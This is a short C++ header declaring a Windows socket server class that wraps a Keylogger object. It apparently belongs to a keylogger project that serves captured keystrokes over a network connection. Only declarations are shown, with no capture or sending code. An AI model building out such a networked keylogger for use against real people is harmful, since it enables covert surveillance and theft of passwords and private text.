#pragma once

#include <iostream>
#include <string>
#include <sstream>
#include <WinSock2.h>
#include <WS2tcpip.h>
#pragma comment(lib, "Ws2_32.lib")

#include "Keylogger.h"

#define BUFFER_SIZE 1024

class SocketServer {
private:
	Keylogger* logger;
	SOCKET listenSocket;

	std::string ip;
	std::string hostName;

	void initHostInfo();
public:
	SocketServer(Keylogger* logger);
	void start();
	std::string getResponse(std::string request);
	~SocketServer();
};

